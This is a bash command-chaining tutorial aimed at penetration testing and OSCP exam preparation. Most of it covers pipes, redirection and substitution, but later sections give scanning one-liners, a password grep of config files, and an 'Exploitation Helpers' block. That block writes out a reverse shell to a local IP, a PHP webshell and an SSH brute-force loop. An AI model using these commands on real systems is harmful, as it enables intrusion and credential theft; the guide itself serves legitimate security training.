# Command Chaining Examples

This document demonstrates powerful command chaining techniques that are essential for penetration testing and the OSCP exam.

## Basic Command Chaining

### Sequential Execution

```bash
# Run commands in sequence (regardless of success)
echo "First command" ; echo "Second command"

# Run second command only if first succeeds
echo "First command" && echo "Second command"

# Run second command only if first fails
echo "First command" || echo "Fallback command"

# Combine AND and OR operators
command && echo "Success" || echo "Failure"
```

### Command Grouping

```bash
# Group commands with parentheses
(cd /tmp && echo "Current dir: $(pwd)")
echo "Back in $(pwd)"

# Redirect output from a group of commands
(echo "Line 1"; echo "Line 2") > file.txt

# Use subshell to preserve current environment
(export VAR="local"; echo $VAR); echo $VAR
```

## Pipes and Redirection

### Basic Piping

```bash
# Pipe output of one command as input to another
cat /etc/passwd | grep "root"

# Multiple pipes
cat /etc/passwd | grep "sh$" | cut -d: -f1

# Count lines/words/characters
cat file.txt | wc -l  # Count lines
cat file.txt | wc -w  # Count words
cat file.txt | wc -c  # Count characters
```

### Advanced Redirection

```bash
# Redirect both stdout and stderr to different files
command > output.txt 2> error.txt

# Redirect stderr to stdout, then to file
command > file.txt 2>&1

# Append stdout and stderr to file
command >> file.txt 2>&1

# Redirect specific file descriptor (fd 3)
command 3> custom_output.txt

# Read from one file, write to another
cat < input.txt > output.txt
```

## Command Substitution

```bash
# Basic command substitution
echo "Today is $(date)"
echo "Files: $(ls)"

# Older syntax (backticks)
echo "Today is `date`"

# Nested command substitution
echo "Files in home: $(find $(echo $HOME) -type f | wc -l)"

# Use in variable assignment
FILES=$(find /etc -name "*.conf")
echo $FILES
```

## Process Substitution

```bash
# Compare outputs of two commands
diff <(ls dir1) <(ls dir2)

# Use multiple command outputs as input
grep "pattern" <(cat file1) <(cat file2)

# Sort combined output of multiple commands
sort -u <(grep "error" log1) <(grep "error" log2)

# Use as input file for a command
grep "pattern" <(curl -s http://example.com)
```

## Practical One-Liners for Penetration Testing

### Network Reconnaissance

```bash
# Ping sweep to find live hosts
for ip in $(seq 1 254); do ping -c 1 192.168.1.$ip | grep "bytes from" | cut -d" " -f4 | cut -d":" -f1 & done

# Quick port scan with bash
for port in $(seq 1 65535); do (echo > /dev/tcp/192.168.1.1/$port) >/dev/null 2>&1 && echo "Port $port is open"; done

# Find all web servers on a network
for ip in $(seq 1 254); do curl -s --connect-timeout 1 http://192.168.1.$ip >/dev/null && echo "Web server found at 192.168.1.$ip"; done

# Banner grabbing
for port in 21 22 25 80 443; do echo "Port $port:" && (echo > /dev/tcp/192.168.1.1/$port) 2>/dev/null && (echo "QUIT" | nc 192.168.1.1 $port); done
```

### File System Enumeration

```bash
# Find all SUID files and save to a file
find / -perm -4000 -type f -exec ls -la {} \; 2>/dev/null > suid_files.txt

# Find writable directories
find / -writable -type d 2>/dev/null | grep -v "^/proc" | sort

# Find files modified in the last day
find / -type f -mtime -1 -not -path "/proc/*" -not -path "/sys/*" -exec ls -la {} \; 2>/dev/null

# Find config files containing password strings
grep -r -l "password" --include="*.conf" --include="*.config" --include="*.ini" /etc/ 2>/dev/null
```

### Log Analysis

```bash
# Extract IP addresses from log file and count occurrences
grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" access.log | sort | uniq -c | sort -nr

# Find failed login attempts
grep "Failed password" /var/log/auth.log | awk '{print $9}' | sort | uniq -c | sort -nr

# Extract user agents from web logs
grep -oE '"Mozilla[^"]*"' access.log | sort | uniq -c | sort -nr

# Find 404 errors in web logs
grep ' 404 ' access.log | cut -d'"' -f2 | sort | uniq -c | sort -nr
```

### Data Extraction and Manipulation

```bash
# Extract email addresses from multiple files
grep -oE '[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}' *.txt | sort | uniq

# Extract URLs from HTML files
grep -oE 'https?://[^"]+' *.html | sort | uniq

# Convert Windows line endings to Unix
find . -type f -name "*.txt" -exec sed -i 's/\r$//' {} \;

# Replace string in multiple files
find . -type f -name "*.php" -exec sed -i 's/old_string/new_string/g' {} \;
```

### System Information Gathering

```bash
# Comprehensive system info in one command
(echo "=== SYSTEM INFO ==="; uname -a; echo "=== CPU INFO ==="; cat /proc/cpuinfo | grep "model name" | uniq; echo "=== MEMORY INFO ==="; free -h; echo "=== DISK INFO ==="; df -h; echo "=== NETWORK INFO ==="; ip a; echo "=== LISTENING PORTS ==="; netstat -tuln) > system_info.txt

# List all installed packages
dpkg -l > installed_packages.txt  # Debian/Ubuntu
rpm -qa > installed_packages.txt  # RHEL/CentOS

# Find all running services
systemctl list-units --type=service --state=running > running_services.txt

# Check for weak permissions on service files
find /etc/systemd/system -type f -exec ls -la {} \; > service_permissions.txt
```

### Exploitation Helpers

```bash
# Generate reverse shell payload and listen for connection
(echo "#!/bin/bash"; echo "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1") > /tmp/shell.sh && chmod +x /tmp/shell.sh && nc -lvp 4444

# Create and serve a simple webshell
echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/shell.php && python3 -m http.server 8000

# Create a wordlist from website content
curl -s http://example.com | html2text | tr -s '[:space:]' '\n' | grep -v '^$' | sort | uniq > wordlist.txt

# Brute force SSH with custom wordlist
for user in $(cat users.txt); do for pass in $(cat passwords.txt); do echo "Trying $user:$pass"; sshpass -p "$pass" ssh -o StrictHostKeyChecking=no "$user@192.168.1.10" "id" && echo "SUCCESS: $user:$pass" && break; done; done
```

## Advanced Bash Features

### Process Substitution with Named Pipes

```bash
# Create a named pipe
mkfifo /tmp/pipe

# Write to the pipe in background
echo "Data" > /tmp/pipe &

# Read from the pipe
cat /tmp/pipe

# Clean up
rm /tmp/pipe
```

### Using xargs for Parallel Processing

```bash
# Run commands in parallel (4 at a time)
cat targets.txt | xargs -P 4 -I {} nmap -sV {}

# Find and compress all log files
find /var/log -name "*.log" | xargs -I {} gzip {}

# Download multiple URLs
cat urls.txt | xargs -P 10 -I {} wget {}
```

### Using tee to Split Output

```bash
# Send output to both a file and another command
echo "test" | tee file.txt | grep "test"

# Append to file while displaying on screen
command | tee -a logfile.txt

# Send output to multiple files
echo "test" | tee file1.txt file2.txt file3.txt

# Use with sudo to write to protected files
echo "new content" | sudo tee /etc/protected_file > /dev/null
```

## OSCP Exam Relevance

During the OSCP exam, command chaining will help you:

1. **Automate Reconnaissance**: Chain commands to quickly identify targets and vulnerabilities
2. **Process Data Efficiently**: Extract and filter relevant information from large datasets
3. **Exploit Vulnerabilities**: Create complex payloads by combining multiple commands
4. **Maintain Access**: Set up persistence mechanisms with minimal commands
5. **Document Findings**: Capture and format output for your report

Remember that well-crafted command chains can significantly reduce the time needed to complete tasks, giving you more time to focus on the challenging aspects of the exam.
